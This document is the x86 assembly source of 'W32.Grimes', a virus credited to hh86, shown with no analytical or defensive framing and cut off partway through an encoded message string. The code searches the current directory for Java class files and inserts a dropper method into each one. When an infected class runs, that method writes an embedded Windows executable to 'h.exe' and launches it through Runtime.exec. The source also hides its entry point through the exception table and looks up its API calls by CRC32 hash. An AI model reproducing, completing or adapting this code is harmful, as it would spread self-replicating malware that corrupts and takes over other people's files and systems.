comment °
W32.Grimes by hh86
- direct action file infector of Java class files in current directory
- prepends method table with its own method containing dropper code
- appends a method to contain an invoke instruction
- new EPO technique using exception table
- uses only one buffer for file infection
- CRC32 instead of API names for smaller code

known bugs:
- it does not support StackMapTable and version 50+ class files
- more data in the constant_pool[] table causes invalid indices
°

.586
.model  flat, stdcall
include grimes.inc

.code
assume fs:nothing

code_begin      label    near
        call    do_message
        call    setup_tables
        call    patchwork
        call    reverse_order

grimes_exe        label    near
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.lpLoaderData]
        mov     esi, dword ptr [eax + _PEB_LDR_DATA.dwInLoadOrderModuleList.FLink]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebp, dword ptr [eax + 18h]
        call    walk_dll
        dd      0b09315f4h                   ;CloseHandle
        dd      0a1efe929h                   ;CreateFileW
        dd      0251097cch                   ;ExitProcess
        dd      0d82bf69ah                   ;FindClose
        dd      03d3f609fh                   ;FindFirstFileW
        dd      081f39c19h                   ;FindNextFileW
        dd      07fbc7431h                   ;GlobalAlloc
        dd      0636b1e9dh                   ;GlobalFree
        dd      0095c03d0h                   ;ReadFile
        dd      0e1bf2253h                   ;SetFileAttributesW
        dd      0efc7ea74h                   ;SetFilePointer
        dd      0cce95612h                   ;WriteFile

;-------------------------------------------------------------------------------
;DLL walker
;-------------------------------------------------------------------------------

walk_dll        label    near
        pop     esi
        mov     ebx, ebp
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        add     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER.e_lfanew shl 1]
        cdq

walk_names      label    near
        mov     eax, ebp
        mov     edi, ebp
        inc     edx
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     edi, dword ptr [eax + edx * 4]
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi], eax
        jne     walk_names
        mov     edi, ebp
        mov     eax, ebp
        add     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        movzx   edi, word ptr [edi + edx * 2]
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lods    dword ptr [esi]
        cmp     al, 12h
        jne     walk_names

;-------------------------------------------------------------------------------
;find files in current directory
;-------------------------------------------------------------------------------

        enter   sizeof WIN32_FIND_DATA + sizeof WIN32_FIND_DATA.cFileName * 2 + sizeof WIN32_FIND_DATA.cAlternate * 2 + 2, 0
        push    "*"
        mov     edi, esp
        push    esp
        push    edi
        call    dword ptr [ebp + 4 + kernel32.kFindFirstFileW]
        xchg    esi, eax
        xor     ebx, ebx

open_file       label    near
        lea     ecx, dword ptr [edi + WIN32_FIND_DATA.cFileName]
        push    dword ptr [edi + WIN32_FIND_DATA.dwFileAttributes]
        push    ecx                                  
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    3                            ;GENERIC_READ | GENERIC_WRITE
        push    ecx
        push    FILE_ATTRIBUTE_ARCHIVE
        push    ecx
        call    dword ptr [ebp + 4 + kernel32.kSetFileAttributesW]
        call    dword ptr [ebp + 4 + kernel32.kCreateFileW]
        push    eax
        push    eax
        mov     ecx, dword ptr [edi + WIN32_FIND_DATA.nFileSizeLow]
        push    ecx
        lea     ecx, dword ptr [ecx + ecx + ADDSIZE1 + ADDSIZE2]
        push    ecx
        push    GMEM_FIXED or GMEM_ZEROINIT  ;GPTR
        call    dword ptr [ebp + 4 + kernel32.kGlobalAlloc]
        pop     ecx
        pop     edx
        push    edx
        push    eax
        push    ecx
        push    ebx
        push    esp
        push    ecx
        push    eax
        push    edx
        call    dword ptr [ebp + 4 + kernel32.kReadFile]
        pop     ecx
        pop     eax
        pop     edx
        push    eax
        pushad
        call    parse_file
        pop     eax
        pop     eax
        pop     esp
        cdq
        pop     dword ptr fs:[edx]
        pop     eax
        popad
        call    dword ptr [ebp + 4 + kernel32.kGlobalFree]
        call    dword ptr [ebp + 4 + kernel32.kCloseHandle]
        call    dword ptr [ebp + 4 + kernel32.kSetFileAttributesW]
        push    edi
        push    esi
        call    dword ptr [ebp + 4 + kernel32.kFindNextFileW]
        test    eax, eax
        jnz     open_file
        push    esi
        call    dword ptr [ebp + 4 + kernel32.kFindClose]
        push    ebx
        call    dword ptr [ebp + 4 + kernel32.kExitProcess]

breakpoint      label    near
        int     3                            ;but it was a trick and the clock struck twelve

;-------------------------------------------------------------------------------
;check Class file magic
;-------------------------------------------------------------------------------

parse_file      label    near
        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        cmp     dword ptr [eax], 0bebafecah
        jne     breakpoint
        xchg    esi, eax
        push    ebx
        push    esp
        lea     eax, dword ptr [ecx + ADDSIZE1 + ADDSIZE2]
        push    eax
        lea     edi, dword ptr [esi + ecx]
        push    edi
        push    edx
        neg     ecx
        push    FILE_END
        push    ebx
        push    ecx
        push    edx
        push    ebp
        mov     ebp, esi

;-------------------------------------------------------------------------------
;do not infect class file version 50 and above 
;-------------------------------------------------------------------------------

        cmp     word ptr [esi + ClassFile.major_version], 3200h
        jae     breakpoint

;-------------------------------------------------------------------------------
;check constant_pool_count may not exceed
;-------------------------------------------------------------------------------

        movzx   eax, word ptr [esi + ClassFile.constant_pool_count]
        xchg    al, ah
        cmp     ax, 0ffffh - (CPCOUNT + 1)
        ja      breakpoint
        xchg    ebx, eax

;-------------------------------------------------------------------------------
;skip constant_pool[] table
;-------------------------------------------------------------------------------

        cdq
        call    parse_cpool
        push    esi

;-------------------------------------------------------------------------------
;skip interfaces[] array
;-------------------------------------------------------------------------------

        movzx   eax, word ptr [esi + sizeof ClassFile.access_flags + sizeof ClassFile.this_class + sizeof ClassFile.super_class]
        xchg    al, ah
        lea     esi, dword ptr [esi + eax * 2 + sizeof ClassFile.access_flags + sizeof ClassFile.this_class + sizeof ClassFile.super_class + sizeof ClassFile.interfaces_count]

;-------------------------------------------------------------------------------
;parse fields[] table
;-------------------------------------------------------------------------------

        lods    word ptr [esi]
        xchg    al, ah
        xchg    ecx, eax
        jecxz   parse_methods

parse_ginfo     label    near
        push    ecx
        movzx   ecx, word ptr [esi + field_info.attributes_count]
        lods    dword ptr [esi]
        lods    dword ptr [esi]
        jecxz   parse_next1
        xchg    cl, ch

parse_gattrb    label    near
        inc     esi
        inc     esi
        lods    dword ptr [esi]
        bswap   eax
        add     esi, eax
        loop    parse_gattrb

parse_next1     label    near
        pop     ecx
        loop    parse_ginfo

;-------------------------------------------------------------------------------
;parse methods[] table
;-------------------------------------------------------------------------------

parse_methods   label    near
        xor     eax, eax
        lods    word ptr [esi]
        xchg    al, ah
        mov     ecx, eax
        inc     eax                          ;always increase methods count
        jz      exit_infect
        xchg    ah, al
        mov     word ptr [esi - sizeof ClassFile.methods_count], ax
        push    esi

parse_minfo     label    near
        push    ecx
        movzx   ecx, word ptr [esi + method_info.attributes_count]
        lods    dword ptr [esi]
        lods    dword ptr [esi]
        jecxz   parse_next2
        xchg    cl, ch

parse_mattrb    label    near
        movzx   edx, word ptr [esi + attribute_info.attribute_name_index]
        xchg    dl, dh
        pushad                               ;must preserve esi/ecx
        call    parse_cpool
        popad
        jnc     skip_attrb                   ;if no results then skip
        mov     eax, dword ptr [esi + sizeof attribute_info + Code_attribute.code_length]
        bswap   eax
        cmp     eax, 0ffffh - APPENDSIZE
        ja      skip_attrb
        test    eax, eax                     ;valid code length
        jz      skip_attrb
        cmp     word ptr [esi + eax + sizeof attribute_info + Code_attribute.exception_table_length], 0
        jne     map_class

skip_attrb      label    near
        inc     esi
        inc     esi
        lods    dword ptr [esi]
        bswap   eax
        add     esi, eax
        loop    parse_mattrb

parse_next2     label    near
        pop     ecx
        loop    parse_minfo

exit_infect     label    near
        int     3

;-------------------------------------------------------------------------------
;copy host constant_pool[] table
;-------------------------------------------------------------------------------

map_class       label    near
        pop     ecx
        pop     eax                          ;pointer to beginning of methods[] table
        pop     ecx                          ;pointer to end of constant_pool[] table
        push    edi
        push    esi
        push    eax
        mov     esi, ebp
        sub     ecx, ebp
        lea     eax, dword ptr [ebx + CPCOUNT]
        xchg    ah, al
        mov     word ptr [esi + ClassFile.constant_pool_count], ax
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     ax, word ptr [esi + ClassFile.this_class - ClassFile.access_flags]
        test    eax, eax
        jz      exit_infect

;-------------------------------------------------------------------------------
;copy our constant_pool[] table
;-------------------------------------------------------------------------------

        push    esi
        call    skip_cpool

cpool_begin     label    near
        db      CONSTANT_Utf8                              ;0001 CONSTANT_Utf8_info tag
        db      0, sizeof US1                              ;0001 CONSTANT_Utf8_info length
US1     db      "<init>"                                   ;0001 CONSTANT_Utf8_info bytes 
        db      CONSTANT_Utf8                              ;0002 CONSTANT_Utf8_info tag
        db      0, sizeof US2                              ;0002 CONSTANT_Utf8_info length
US2     db      "()V"                                      ;0002 CONSTANT_Utf8_info bytes 
        db      CONSTANT_Utf8                              ;0003 CONSTANT_Utf8_info tag
        db      0, sizeof US3                              ;0003 CONSTANT_Utf8_info length
US3     db      "rw"                                       ;0003 CONSTANT_Utf8_info bytes 
        db      CONSTANT_Utf8                              ;0004 CONSTANT_Utf8_info tag
        db      0, sizeof US4                              ;0004 CONSTANT_Utf8_info length
US4     db      "h.exe"                                    ;0004 CONSTANT_Utf8_info bytes 
        db      CONSTANT_Utf8                              ;0005 CONSTANT_Utf8_info tag
        db      0, sizeof US5                              ;0005 CONSTANT_Utf8_info length
US5     db      "java/io/RandomAccessFile"                 ;0005 CONSTANT_Utf8_info bytes 
        db      CONSTANT_Utf8                              ;0006 CONSTANT_Utf8_info tag
        db      0, sizeof US6                              ;0006 CONSTANT_Utf8_info length
US6     db      "(Ljava/lang/String;Ljava/lang/String;)V"  ;0006 CONSTANT_Utf8_info bytes 
        db      CONSTANT_Utf8                              ;0007 CONSTANT_Utf8_info tag
        db      0, sizeof US7                              ;0007 CONSTANT_Utf8_info length
US7     db      "close"                                    ;0007 CONSTANT_Utf8_info bytes 
        db      CONSTANT_Utf8                              ;0008 CONSTANT_Utf8_info tag
        db      0, sizeof US8                              ;0008 CONSTANT_Utf8_info length
US8     db      "([BII)V"                                  ;0008 CONSTANT_Utf8_info bytes 
        db      CONSTANT_Utf8                              ;0009 CONSTANT_Utf8_info tag
        db      0, sizeof US9                              ;0009 CONSTANT_Utf8_info length
US9     db      "write"                                    ;0009 CONSTANT_Utf8_info bytes
        db      CONSTANT_Utf8                              ;000a CONSTANT_Utf8_info tag
        db      0, sizeof US10                             ;000a CONSTANT_Utf8_info length
US10    db      "java/lang/Runtime"                        ;000a CONSTANT_Utf8_info bytes
        db      CONSTANT_Utf8                              ;000b CONSTANT_Utf8_info tag
        db      0, sizeof US11                             ;000b CONSTANT_Utf8_info length
US11    db      "getRuntime"                               ;000b CONSTANT_Utf8_info bytes
        db      CONSTANT_Utf8                              ;000c CONSTANT_Utf8_info tag
        db      0, sizeof US12                             ;000c CONSTANT_Utf8_info length
US12    db      "()Ljava/lang/Runtime;"                    ;000c CONSTANT_Utf8_info bytes
        db      CONSTANT_Utf8                              ;000d CONSTANT_Utf8_info tag
        db      0, sizeof US13                             ;000d CONSTANT_Utf8_info length
US13    db      "exec"                                     ;000d CONSTANT_Utf8_info bytes
        db      CONSTANT_Utf8                              ;000e CONSTANT_Utf8_info tag
        db      0, sizeof US14                             ;000e CONSTANT_Utf8_info length
US14    db      "(Ljava/lang/String;)Ljava/lang/Process;"  ;000e CONSTANT_Utf8_info bytes
        db      CONSTANT_String                            ;000f CONSTANT_String_info tag
index1  dw      3 - 1                                      ;000f CONSTANT_String_info string index "rw"
        db      CONSTANT_String                            ;0010 CONSTANT_String_info tag
index2  dw      4 - 1                                      ;0010 CONSTANT_String_info string index "h.exe"
        db      CONSTANT_Class                             ;0011 CONSTANT_Class_info tag
index3  dw      5 - 1                                      ;0011 CONSTANT_Class_info name index
        db      CONSTANT_NameAndType                       ;0012 CONSTANT_NameAndType_info tag
index4  dw      9 - 1                                      ;0012 CONSTANT_NameAndType_info name index "write"
index5  dw      8 - 1                                      ;0012 CONSTANT_NameAndType_info descriptor index "([BII)V"
        db      CONSTANT_NameAndType                       ;0013 CONSTANT_NameAndType_info tag
index6  dw      7 - 1                                      ;0013 CONSTANT_NameAndType_info name index "close"
index7  dw      2 - 1                                      ;0013 CONSTANT_NameAndType_info descriptor index "()V"
        db      CONSTANT_NameAndType                       ;0014 CONSTANT_NameAndType_info tag
index8  dw      1 - 1                                      ;0014 CONSTANT_NameAndType_info name index "<init>"
index9  dw      6 - 1                                      ;0014 CONSTANT_NameAndType_info descriptor index "(Ljava/lang/String;Ljava/lang/String;)V"
        db      CONSTANT_Methodref                         ;0015 CONSTANT_Methodref_info tag
index10 dw      11h - 1                                    ;0015 CONSTANT_Methodref_info class index
index11 dw      13h - 1                                    ;0015 CONSTANT_Methodref_info name and type index "close()V"
        db      CONSTANT_Methodref                         ;0016 CONSTANT_Methodref_info tag
index12 dw      11h - 1                                    ;0016 CONSTANT_Methodref_info class index
index13 dw      14h - 1                                    ;0016 CONSTANT_Methodref_info name and type index "<init>(Ljava/lang/String;Ljava/lang/String;)V"
        db      CONSTANT_Methodref                         ;0017 CONSTANT_Methodref_info tag
index14 dw      11h - 1                                    ;0017 CONSTANT_Methodref_info class index
index15 dw      12h - 1                                    ;0017 CONSTANT_Methodref_info name and type index "write([BII)V"
        db      CONSTANT_Utf8                              ;0018 CONSTANT_Utf8_info tag
        db      0, 4                                       ;0018 CONSTANT_Utf8_info length
        db      "hh86"                                     ;0018 CONSTANT_Utf8_info bytes 
        db      CONSTANT_NameAndType                       ;0019 CONSTANT_NameAndType_info tag
index16 dw      18h - 1                                    ;0019 CONSTANT_NameAndType_info name index "hh86"
index17 dw      2 - 1                                      ;0019 CONSTANT_NameAndType_info descriptor index "()V"
        db      CONSTANT_Methodref                         ;001a CONSTANT_Methodref_info tag
index18 dw      0                                          ;001a CONSTANT_Methodref_info class index
index19 dw      19h - 1                                    ;001a CONSTANT_Methodref_info name and type index "hh86()V"
        db      CONSTANT_NameAndType                       ;001b CONSTANT_NameAndType_info tag
index29 dw      0dh - 1                                    ;001b CONSTANT_NameAndType_info name index "exec"
index30 dw      0eh - 1                                    ;001b CONSTANT_NameAndType_info descriptor index "(Ljava/lang/String;)Ljava/lang/Process;"
        db      CONSTANT_NameAndType                       ;001c CONSTANT_NameAndType_info tag
index31 dw      0bh - 1                                    ;001c CONSTANT_NameAndType_info name index "getRuntime"
index32 dw      0ch - 1                                    ;001c CONSTANT_NameAndType_info descriptor index "()Ljava/lang/Runtime"
        db      CONSTANT_Class                             ;001d CONSTANT_Class_info tag
index33 dw      0ah - 1                                    ;001d CONSTANT_Class_info name index
        db      CONSTANT_Methodref                         ;001e CONSTANT_Methodref_info tag
index34 dw      1dh - 1                                    ;001e CONSTANT_Methodref_info class index
index35 dw      1bh - 1                                    ;001e CONSTANT_Methodref_info name and type index "exec(Ljava/lang/String;)Ljava/lang/Process;"
        db      CONSTANT_Methodref                         ;001f CONSTANT_Methodref_info tag
index36 dw      1dh - 1                                    ;001f CONSTANT_Methodref_info class index
index37 dw      1ch - 1                                    ;001f CONSTANT_Methodref_info name and type index "getRuntime()Ljava/lang/Runtime;"
        ;do not add any more data or risk update failure
cpool_end       label    near

offtable        label    near
        db      offset offtable - offset index1
        db      offset offtable - offset index2
        db      offset offtable - offset index3
        db      offset offtable - offset index4
        db      offset offtable - offset index5
        db      offset offtable - offset index6
        db      offset offtable - offset index7
        db      offset offtable - offset index8
        db      offset offtable - offset index9
        db      offset offtable - offset index10
        db      offset offtable - offset index11
        db      offset offtable - offset index12
        db      offset offtable - offset index13
        db      offset offtable - offset index14
        db      offset offtable - offset index15
        db      offset offtable - offset index16
        db      offset offtable - offset index17
        db      offset offtable - offset index19
        db      offset offtable - offset index29
        db      offset offtable - offset index30
        db      offset offtable - offset index31
        db      offset offtable - offset index32
        db      offset offtable - offset index33
        db      offset offtable - offset index34
        db      offset offtable - offset index35
        db      offset offtable - offset index36
        db      offset offtable - offset index37

method_begin    label    near
        db      0, ACC_PUBLIC or ACC_STATIC                ;method access flags
index20 dw      18h - 1                                    ;method name index
index21 dw      2 - 1                                      ;method descriptor index
        db      0, 1                                       ;method attributes[] entries count
index22 dw      0                                          ;attribute name index

attrsize_patch  label    near
        dd      "hh86"                                     ;attribute length
        db      0, 4                                       ;code stack max size 
        db      0, 2                                       ;code locals size

codesize_patch  label    near
        dd      "hh86"                                     ;code[] length

dropperpart1    label    near
        db      OP_SIPUSH
        dw      (((ARRAYSIZE and 0ff00h) shr 8) or ((ARRAYSIZE and 0ffh) shl 8))
        db      OP_NEWARRAY, BYTETYPE
        db      OP_ASTORE0

arraycode       label    near

offtable1       label    near
        db      offset offtable1 - offset index20
        db      offset offtable1 - offset index21

exestub         label    near
        db      "M",                                IMAGE_DOS_HEADER.e_magic
        db      "Z",                                IMAGE_DOS_HEADER.e_magic + 1
        db      "P",                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.Signature
        db      "E",                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.Signature + 1
        db      low IMAGE_FILE_MACHINE_I386,        IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Machine
        db      high IMAGE_FILE_MACHINE_I386,       IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Machine + 1
        db      1,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.NumberOfSections
        db      60h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
        db      2,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Characteristics
        db      low IMAGE_NT_OPTIONAL_HDR32_MAGIC,  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Magic
        db      high IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Magic + 1
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint + 1
        db      0ch,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.BaseOfData
        db      40h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.ImageBase + 2
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment + 1
        db      2,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.FileAlignment + 1
        db      4,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.MajorSubsystemVersion
        db      40h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage + 1
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders + 1
        db      IMAGE_SUBSYSTEM_WINDOWS_GUI,        IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Subsystem
        db      30h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.Misc.VirtualSize + 79h
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.VirtualAddress + 79h
        db      6,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.SizeOfRawData + 79h
        db      2,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.PointerToRawData + 79h
        db      0a0h,                               IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.Characteristics + 7bh

dropperpart2    label    near
        db      OP_NEW
index23 dw      11h - 1
        db      OP_DUP
        db      OP_LDCW
index24 dw      10h - 1
        db      OP_LDCW
index25 dw      0fh - 1
        db      OP_INVOKESPECIAL
index26 dw      016h - 1
        db      OP_ASTORE1
        db      OP_ALOAD1
        db      OP_ALOAD0
        db      OP_ICONST0
        db      OP_ALOAD0     
        db      OP_ARRAYLENGTH
        db      OP_INVOKEVIRTUAL
index27 dw      17h - 1
        db      OP_ALOAD1
        db      OP_INVOKEVIRTUAL
index28 dw      15h - 1
        db      OP_INVOKESTATIC
index38 dw      1fh - 1
        db      OP_LDCW
index39 dw      10h - 1
        db      OP_INVOKEVIRTUAL
index40 dw      1eh - 1
                                             ;there is one value in the stack:
handler_begin   label    near
        db      OP_POP
        db      OP_RETURN
        
dropper_end     label    near
        db      0, 1                         ;exception_table_length
        db      0, 0                         ;start_pc

endpc_patch     label    near
        dw      0                            ;end_pc

handler_patch   label    near
        dw      0                            ;handler_pc
        dw      0                            ;catch_type
        dw      0                            ;attributes_count

method_end      label    near

offtable2       label    near
        db      offset offtable2 - offset index23
        db      offset offtable2 - offset index24
        db      offset offtable2 - offset index25
        db      offset offtable2 - offset index26
        db      offset offtable2 - offset index27
        db      offset offtable2 - offset index28
        db      offset offtable2 - offset index38  
        db      offset offtable2 - offset index39  
        db      offset offtable2 - offset index40            

skip_cpool      label    near
        pop     esi
        mov     cx, offset cpool_end - offset cpool_begin
        rep     movs byte ptr [edi], byte ptr [esi]

;-------------------------------------------------------------------------------
;update our constant_pool[] indices
;-------------------------------------------------------------------------------

        xchg    dl, dh
        mov     word ptr [esi + (offset index22 - offset offtable)], dx
        mov     word ptr [edi - (offset offtable - offset index18)], ax
        mov     cl, offset method_begin - offset offtable
        call    update_offs

;-------------------------------------------------------------------------------
;copy every thing until methods[] table
;-------------------------------------------------------------------------------

        xchg    eax, esi
        pop     esi
        pop     ecx
        sub     ecx, esi
        rep     movs byte ptr [edi], byte ptr [esi]

;-------------------------------------------------------------------------------
;copy our method_info, attribute_info, Code_attribute to host
;-------------------------------------------------------------------------------

        push    esi
        xchg    eax, esi
        mov     cl, offset arraycode - offset method_begin
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     cl, OTBLSIZE1
        call    update_offs
        mov     cl, PESIZE / 2

store_pebytes   label    near
        mov     al, OP_ALOAD0
        stos    byte ptr [edi]
        call    store_sipush 
        dec     edi
        call    store_sipush
        loop    store_pebytes
        push    esi
        sub     esi, offset dropperpart2 - offset grimes_exe
        mov     cx, offset code_end - offset grimes_exe
        mov     edx, 200h                    ;IMAGE_SECTION_HEADER.PointerToRawData field

store_cobytes   label    near
        mov     ax, (OP_SIPUSH shl 8) + OP_ALOAD0
        stos    word ptr [esi]
        mov     eax, edx
        xchg    ah, al
        stos    word ptr [edi]
        call    store_sipush
        inc     edx
        loop    store_cobytes
        pop     esi
        mov     cl, offset method_end - offset dropperpart2
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     cl, OTBLSIZE2
        call    update_offs        
        pop     esi

;-------------------------------------------------------------------------------
;copy every thing until target method
;-------------------------------------------------------------------------------

        pop     ecx
        sub     ecx, esi
        rep     movs byte ptr [edi], byte ptr [esi]
        movs    word ptr [edi], word ptr [esi]

;-------------------------------------------------------------------------------
;increase attribute length and code length
;copy host method code, write code to invoke our method
;hook exception handler
;-------------------------------------------------------------------------------

        lods    dword ptr [esi]
        bswap   eax
        add     eax, APPENDSIZE 
        bswap   eax
        stos    dword ptr [edi]
        movs    dword ptr [edi], dword ptr [esi]
        lods    dword ptr [esi]
        bswap   eax
        mov     ecx, eax
        mov     edx, eax
        add     eax, APPENDSIZE
        bswap   eax
        stos    dword ptr [edi]
        rep     movs byte ptr [edi], byte ptr [esi]
        lea     eax, dword ptr [ebx + (OP_INVOKESTATIC shl 10h) + methodref - 1]
        bswap   eax
        stos    dword ptr [edi]
        mov     al, OP_GOTO
        stos    byte ptr [edi]
        mov     eax, edx
        xchg    dh, dl
        xchg    word ptr [esi + 2 + exception_table.handler_pc], dx
        xchg    dh, dl
        sub     eax, edx
        add     eax, APPENDSIZE - 3
        neg     eax
        xchg    ah, al
        stos    word ptr [edi]               ;goto address

;-------------------------------------------------------------------------------
;copy remaining contents
;-------------------------------------------------------------------------------

        pop     ecx
        sub     ecx, esi
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     ebp
        call    dword ptr [ebp + 4 + kernel32.kSetFilePointer]
        call    dword ptr [ebp + 4 + kernel32.kWriteFile]

infect_exit     label    near
        int     3

store_sipush    proc     near
        mov     al, OP_SIPUSH
        stos    byte ptr [edi]
        xor     eax, eax
        lods    byte ptr [esi]
        xchg    ah, al
        stos    word ptr [edi]
        mov     al, OP_BASTORE
        stos    byte ptr [edi]
        ret
store_sipush    endp

update_offs     proc     near
        movsx   eax, byte ptr [esi]
        movzx   edx, word ptr [edi + eax]
        add     edx, ebx
        xchg    dh, dl
        mov     word ptr [edi + eax], dx
        inc     esi
        loop    update_offs
        ret
update_offs     endp

;-------------------------------------------------------------------------------
;parse constant_pool[] table
;-------------------------------------------------------------------------------

parse_cpool     proc     near
        lea     esi, dword ptr [ebp + ClassFile.constant_pool]
        xor     ecx, ecx
        inc     ecx
        push    ebx

pool_gettag     label    near
        lods    byte ptr [esi]
        cmp     al, CONSTANT_Utf8
        je      parse_utf8
        cmp     al, CONSTANT_Float
        jbe     skip_info5
        cmp     al, CONSTANT_Double
        jbe     skip_info9
        cmp     al, CONSTANT_String
        jbe     skip_info3
        cmp     al, CONSTANT_NameAndType
        jbe     skip_info5
        cmp     al, CONSTANT_MethodHandle
        je      skip_info4
        cmp     al, CONSTANT_MethodType
        je      skip_info3
        cmp     al, CONSTANT_InvokeDynamic
        jne     skip_info5

parse_next      label    near
        inc     ecx
        cmp     ecx, ebx
        jb      pool_gettag
        pop     ebx
        ret

skip_info3      label    near
        dec     esi

skip_info4      label    near
        dec     esi
        jmp     skip_info5

skip_info9      label    near
        inc     ecx
        lods    dword ptr [esi]

skip_info5      label    near
        lods    dword ptr [esi]
        jmp     parse_next

parse_utf8      label    near
        movzx   eax, word ptr [esi + CONSTANT_Utf8_info.slength - 1]
        xchg    ah, al
        cmp     eax, 4
        jne     skip_string
        cmp     dword ptr [esi + CONSTANT_Utf8_info.bytes - 1], "68hh"
        je      infect_exit
        cmp     dword ptr [esi + CONSTANT_Utf8_info.bytes - 1], "edoC"
        jne     skip_string
        cmp     edx, ecx
        jne     skip_string
        pop     ebx
        stc
        ret
        
skip_string     label    near
        lea     esi, dword ptr [esi + eax + sizeof CONSTANT_Utf8_info.slength]
        jmp     parse_next
parse_cpool     endp

code_end        label    near

setup_tables    proc     near
        mov     esi, offset offtable
        mov     ecx, offset method_begin - offset offtable
        call    make_negoffs
        mov     esi, offset offtable1 
        mov     cl, OTBLSIZE1
        call    make_negoffs
        mov     esi, offset offtable2 
        mov     cl, OTBLSIZE2

make_negoffs    label    near
        neg     byte ptr [esi]
        inc     esi
        loop    make_negoffs
        ret
setup_tables    endp

patchwork       proc
        mov     eax, sizeof Code_attribute + CODESIZE + sizeof exception_table
        bswap   eax
        mov     dword ptr [attrsize_patch], eax
        mov     eax, CODESIZE
        bswap   eax
        mov     dword ptr [codesize_patch], eax
        mov     ax, CODESIZE - (offset dropper_end - offset handler_begin)
        xchg    ah, al
        mov     word ptr [endpc_patch], ax
        mov     word ptr [handler_patch], ax
        ret
patchwork       endp

reverse_order   proc
        mov     ecx, PESIZE / 2
        mov     esi, offset exestub
        mov     edi, esi

swap_bytes      label    near
        lods    word ptr [esi]
        xchg    ah, al
        stos    word ptr [edi]
        loop    swap_bytes
        ret
reverse_order   endp

do_message      proc
        call    text_end

text_begin      label    near
        db      49h, 20h, 63h, 68h
        db      72h, 69h, 73h, 74h
        db      65h, 6eh, 20h, 79h
        db      6fh, 75h, 72h, 20h
        db      66h, 72h, 69h, 67h
        db      68h, 74h, 65h, 6eh
        db      69h, 6eh, 67h, 20h
        db      66h, 6ch, 69h, 67h
        db      68h, 74h, 3ah, 0ah
        db      0dh, 59h, 6fh, 75h
        db      6eh, 67h, 20h, 65h
        db      61h, 67h, 6ch, 65h
        db      2ch, 20h, 72h, 69h
        db      73h, 65h, 20h, 69h
        db      6eh, 20h, 74h, 68h
        db      65h, 20h, 61h, 69h
        db      72h, 21h, 0ah, 0dh
        db      59h, 6fh, 75h, 20h
        db      73h, 74h, 61h, 72h
        db      65h, 64h, 20h, 61h
        db      74h, 20h, 74h, 68h
        db      65h, 20h, 73h, 75h
        db      6eh, 21h, 20h, 2dh
        db      20h, 6dh, 79h, 20h
        db      6ch, 69h, 67h, 68h
        db      74h, 0ah, 0dh, 41h
        db      6eh, 64h, 20h, 64h
        db      65h, 6ch, 69h, 63h
        db      61h, 74h, 65h, 20h
        db      67h, 61h, 7ah, 65h
        db      20h, 63h, 61h, 6eh
        db      27h, 74h, 20h, 63h
        db      6fh, 6dh, 70h, 61h
        db      72h, 65h, 2eh, 0ah
        db      0dh, 0ah, 0dh, 49h
        db      20h, 73h, 74h, 6fh
        db      6fh, 64h, 2ch, 20h
        db      6dh, 6fh, 72h, 65h
        db      20h, 74h, 65h, 6eh
        db      64h, 65h, 72h, 20h
        db      74h, 68h, 61h, 6eh
        db      20h, 74h, 68h, 6fh
